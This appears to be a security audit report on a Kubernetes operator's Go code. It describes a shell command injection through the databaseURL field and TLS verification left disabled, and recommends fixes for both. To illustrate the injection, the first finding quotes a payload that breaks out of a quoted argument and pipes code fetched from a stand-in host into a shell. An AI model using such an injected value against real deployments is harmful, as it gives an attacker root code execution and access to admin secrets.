summary: Reviewed the Go sources of the warpgate-operator Kubernetes operator under internal/, cmd/, and api/, focusing on the Warpgate API client, the reconcilers (which generate Pod/Deployment specs, ConfigMaps and Secrets), and the admission webhooks. The most serious issue is an OS command injection: the WarpgateInstance reconciler interpolates the user-controlled spec.databaseURL straight into a `/bin/sh -c` init-container script with no validation or escaping. Credential generation uses crypto/rand correctly and secrets are stored in Kubernetes Secrets rather than logged. A secondary issue is that TLS verification is unconditionally disabled for the operator's connection to each instance. Test files were not treated as in scope.

findings.title: OS command injection via WarpgateInstance spec.databaseURL in init-container script
findings.description: The WarpgateInstance reconciler builds the init container's shell script by string concatenation and interpolates the user-supplied spec.databaseURL directly into the command line of `warpgate ... unattended-setup`. The assembled string is executed as `/bin/sh -c initScript` (Command set at line 776). spec.databaseURL is attacker-controlled: the admission validator in api/v1alpha1/warpgateinstance_webhook.go (validateWarpgateInstance, lines 256-258) only emits an informational warning for it and performs no character validation or escaping. A databaseURL value such as `sqlite:/data/db" ; curl http://evil/x | sh ; echo "` (or using backticks/`$()`) breaks out of the quoted argument and runs arbitrary commands in the init container, which runs as root, has the ADMIN_PASSWORD secret injected as an env var (lines 779-790) and the instance's mounted secrets/volumes available. This lets anyone able to create/update a WarpgateInstance CR obtain code execution in the operator-managed pod even when image-restriction admission policies pin the official Warpgate image. The same unescaped field is also written into the generated warpgate.yaml at line 345 (config injection).
findings.recommendation: Do not build the shell command by interpolating user input. Pass databaseURL to the setup binary via an environment variable sourced from the spec (like ADMIN_PASSWORD) and reference it as a quoted "${DATABASE_URL}" in the script, or strictly validate databaseURL against an allowed URL/DSN grammar in the admission webhook (reject shell metacharacters, quotes, newlines, backticks, $). Apply the same treatment where databaseURL and externalHost are written into warpgate.yaml.

findings.title: TLS verification unconditionally disabled for operator-to-instance WarpgateConnection
findings.description: When the operator auto-creates a WarpgateConnection for a managed instance it hardcodes InsecureSkipVerify: true. The resulting client (internal/warpgate/client.go:55-58) then sends the admin API token / admin username+password (built into the auth secret at lines 1055-1090) to the instance over HTTPS with certificate verification completely disabled. An attacker able to intercept or spoof the in-cluster service endpoint (e.g. via DNS/service hijacking or a man-in-the-middle position inside the cluster network) can impersonate the instance and capture the Warpgate admin credentials. Severity is limited because this is an in-cluster service path and exploitation requires an existing network foothold.
findings.recommendation: When cert-manager or a provided TLS secret is in use, trust the instance's CA instead of disabling verification: set a RootCAs pool (or ServerName) on the client's tls.Config from the known CA/cert rather than InsecureSkipVerify. Reserve InsecureSkipVerify for the explicitly user-opted-in case only.
